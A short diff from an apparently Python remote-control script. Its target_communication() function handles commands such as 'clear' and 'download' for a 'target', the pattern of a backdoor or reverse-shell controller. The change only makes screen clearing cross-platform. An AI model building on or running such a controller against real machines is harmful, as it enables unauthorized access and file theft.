@@ -79,7 +79,7 @@ def target_communication():
 			pass
 
 		elif command == "clear" or command=="cls":
-			os.system("cls")
+			os.system("cls||clear")
 
 		elif command[:8] == "download":
 			download_file(command[9:])
